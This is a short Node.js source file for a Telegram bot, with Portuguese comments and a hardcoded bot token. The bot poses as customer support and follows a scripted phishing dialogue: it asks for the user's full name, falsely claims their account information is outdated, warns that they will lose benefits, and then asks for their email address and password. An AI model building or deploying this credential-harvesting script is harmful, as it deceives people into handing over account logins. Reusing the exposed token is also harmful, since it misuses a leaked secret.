const { Telegraf } = require('telegraf');

const bot = new Telegraf("5800755353:AAGo8rqfCo0-PcAr97SyUQrd_z22bkmqVpA"); // Link gerado pelo botfather na hora de fazer e cadastrar o bot

//Função onde as mensagens específicas serão enviadas como resposta as mensagens do usuário
async function conditional(ctx, text){
    if(text == ''){
        return;
    }
    if(text.toLowerCase().includes('oi')){
        await ctx.telegram.sendMessage(ctx.message.chat.id, 'Poderia me informar seu nome completo para iniciarmos o atendimento?');
        return;
    }
    if(text.normalize("NFD").replace(/\p{Diacritic}/gu, "").toLowerCase().includes(ctx.message.chat.first_name.toLowerCase())){
        await ctx.telegram.sendMessage(ctx.message.chat.id, text+', foram identificadas algumas informações desatualizadas na sua conta.');
        await new Promise(r => setTimeout(r, 2000))
        await ctx.telegram.sendMessage(ctx.message.chat.id, 'Caso contrário você não poderá usufruir dos benefícios desses produtos');
        await new Promise(r => setTimeout(r, 2000))
        await ctx.telegram.sendMessage(ctx.message.chat.id, 'Para prosseguir, poderia me informar seu email e senha de acesso?');
        return;
    }
    if(text.toLowerCase().includes('@')){
        await ctx.telegram.sendMessage(ctx.message.chat.id, 'Infelizmente, ');
        return;
    }
    await ctx.telegram.sendMessage(ctx.message.chat.id, "Envie um oi para iniciar o suporte");
};


bot.on('text', async (ctx) => {
    await conditional(ctx, ctx.message.text);
});
bot.launch();
